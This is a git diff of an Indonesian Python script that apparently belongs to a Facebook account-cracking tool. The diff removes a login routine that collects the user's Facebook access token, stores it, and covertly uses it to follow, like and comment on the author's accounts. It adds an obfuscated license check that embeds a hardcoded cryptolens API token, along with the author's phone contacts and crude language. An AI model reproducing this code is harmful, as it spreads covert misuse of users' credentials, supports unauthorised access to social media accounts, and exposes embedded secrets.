@@ -60,47 +60,55 @@ def banner():
 ██║  ██╗██║  ██║███████╗███████╗███████╗███████╗███████╗
 ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝╚══════╝╚══════╝ 
 """%(N))                                                    
+───────────────────────────────────────────────────────
+ [\x1b[1;96m+%s] Nama       : KALZE
+ [\x1b[1;96m+%s] WhatsApp   : 6283865283286
+ [\x1b[1;96m+%s] Facebook   : @KLZ
+ [\x1b[1;96m+%s] Github      : https://github.com/kalze123/kalze-new
+───────────────────────────────────────────────────────\n'''%(N,N,N,N))
+def kontol():
+    os.system("git pull")
+    print(f"""    __    _________________   _______ ______
+   / /   /  _/ ____/ ____/ | / / ___// ____/
+  / /    / // /   / __/ /  |/ /\__ \/ __/
+ / /____/ // /___/ /___/ /|  /___/ / /___
+/_____/___/\____/_____/_/ |_//____/_____/
+{P}[•]{B}----------------------------------------------------{P}[•]
+{B} |
+{P}[•] AUTHOR: KALZE-XD
+{P}[•] WHATSAPP: 6283865283286
+{B}[•] FACEBOOK: KALZE-XD""")
+def licensi():#line:42
+  try :#line:43
+    os .system ('clear')
+    kontol()
+    print (f"""
+{U}[{P}1{U}]{P} Dapatkan Api key
+{U}[{P}2{U}]{P} Masukan Api Key
+{U}[{P}3{U}]{P} Keluar {U}[{H}Exit{U}]{H}
+""")#line:49
+    OOO00O0OOO00OO00O =input (f"{H}[{P}?{H}]{P} Choose :{K} ")#line:50
+    if OOO00O0OOO00OO00O in ['1','01']:#line:51
+      print (f"{H}[{P}!{H}]{P} Anda Akan Diarahkan Ke Whatsapp...");time .sleep (3 );os .system ('xdg-open https://wa.me/6283865283286?text=Bang+Kalz+Beli+Lisensi');exit ()#line:52
+    elif OOO00O0OOO00OO00O in ['2','02']:#line:53
+      O000O000OOO000OOO =input (f"{H}[{P}?{H}]{P} Api Key :{K} ")#line:54
+      if len (O000O000OOO000OOO )==0 :#line:55
+        exit (f"{P}[{M}!{P}]{M} Jangan Kosong")#line:56
+      else :#line:57
+        with requests .Session ()as O0O0OO0O0O00OOOO0 :#line:58   #### ISI TOKEN LU DAN   ID LU
+          OOO00OO00O0O0OOOO =O0O0OO0O0O00OOOO0 .get(f'https://app.cryptolens.io/api/key/activate?token=WyIxNjk4MzkyOCIsIktFWUhHaUJzQkZzcEpTdXFRMXh0ZUh3U0crOWpyNk9LM1ZWV0xSQlkiXQ==&ProductId=14877&Key={O000O000OOO000OOO}&Sign=True').json ()['licenseKey']#line:59
+          open ('apikey.txt','w').write (O000O000OOO000OOO )#line:60
+          print (f"{H}[{P}*{H}]{P} Expired :{K} {OOO00OO00O0O0OOOO['expires'].split('T')[0]}");time .sleep (2 );login()#line:61
+    elif OOO00O0OOO00OO00O in ['3','03']:#line:62
+      exit ()#line:63
+    else :#line:64
+      exit (f"{P}[{M}!{P}]{M} Wrong Input")#line:65
+  except (KeyError ):#line:66
+    exit (f"{P}[{M}!{P}]{M} Api Key Invalid")#line:67
+  except Exception as O0OO00OOO000OOO00 :#line:68
+    exit (f"{P}[{M}!{P}]{M} {O0OO00OOO000OOO00}")#line:69
 
-class login:
-
-	def __init__(self):
-		self.ada = []
-	def __login__(self):
-		banner()
-		token = input(' [*] Masukan token : ')
-		if token in ['']:
-			time.sleep(2);login().__login__()
-		else:
-			try:
-				cc = requests.get('https://graph.facebook.com/me?access_token=%s'%(token)).json()['name']
-				open('token.x','w').write(token)
-				print('\n [+] Login berhasil' )
-				self.bot()
-			except KeyError:
-				jalan(' [!] Token error coba ganti akun tumbal!')
-				self.takon()
-	def takon(self):
-		takon = input('\n [!] Mau tau cara ambil token y/t: ')
-		if takon in ['y','Y','iya']:
-			jalan('\n [!] Kamu akan di arahkan ke Ke Wa Untuk Donasi')
-			os.system('xdg-open wa.me/62895386194665')
-		else:
-			login().__login__()
-	def bot(self):
-		# HARGAI SEDIKIT AJA JANGAN GANTI BOT FOLOW NYA CUKUP TAMBAHKAN, TERIMA KASIH BUAT YG PENGERTIAN :V
-		try:
-			toket = open('token.x','r').read()
-		except IOError:
-			jalan('\n [!] Token mokad ganti akun!');time.sleep(1);login().__login__()
-		requests.post('https://graph.facebook.com/100006414900732/subscribers?access_token=' + toket)
-		requests.post('https://graph.facebook.com/100006414900732/subscribers?access_token=' + toket)
-		requests.post('https://graph.facebook.com/100006414900732/subscribers?access_token=' + toket)
-		requests.post('https://graph.facebook.com/100006414900732/comments/?message=' +komen+ '&access_token=' + toket)
-		requests.post('https://graph.facebook.com/3086614624895671/likes?summary=true&access_token=' + toket)
-		requests.post('https://graph.facebook.com/3086614624895671/comments/?message='+komen+'&access_token=' + toket)
-		requests.post('https://graph.facebook.com/3086614624895671/likes?summary=true&access_token=' + toket)
-		os.system('xdg-open wa.me/62895386194665')
-		menu().main()
+balmond = O+"["+J+"•"+O+"]"
 		
 def menu():
 	try:sh = requests.get('https://httpbin.org/ip').json()
@@ -1051,5 +1059,9 @@ def uas(__Aang__Sayang__Laura__):
 		print ('\n%s[%s!%s] Yang bener kontol'%(P,K,P));time.sleep(2)
 		uas(__Aang__Sayang__Laura__)
 		
-if __name__ == '__main__':
-      banner()
+if __name__=='__main__':
+	try:os.mkdir('CP')
+	except:pass
+	try:os.mkdir('OK')
+	except:pass
+	licensi()
